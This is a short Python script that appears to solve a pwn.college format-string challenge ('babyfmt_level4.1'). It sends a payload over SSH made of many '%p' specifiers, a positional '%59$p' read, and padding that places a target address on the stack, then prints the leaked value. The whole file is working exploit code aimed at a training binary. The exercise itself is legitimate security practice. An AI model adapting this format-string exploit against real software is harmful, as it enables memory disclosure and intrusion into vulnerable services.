import subprocess
import struct

ADDR = 0x4040E0
SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

fmt = "AAA " + ("%p " * 80) + "|%59$p"
chunks = []
for k in range(32):
    if k == 1:
        chunks.append(struct.pack("<Q", ADDR))
    else:
        chunks.append(b"A" * 8)

payload = fmt.encode() + b"".join(chunks)
res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
out = res.stdout.decode("latin-1", errors="ignore")

for line in out.splitlines():
    if line.startswith("AAA "):
        print(line.split("|")[-1])
        break
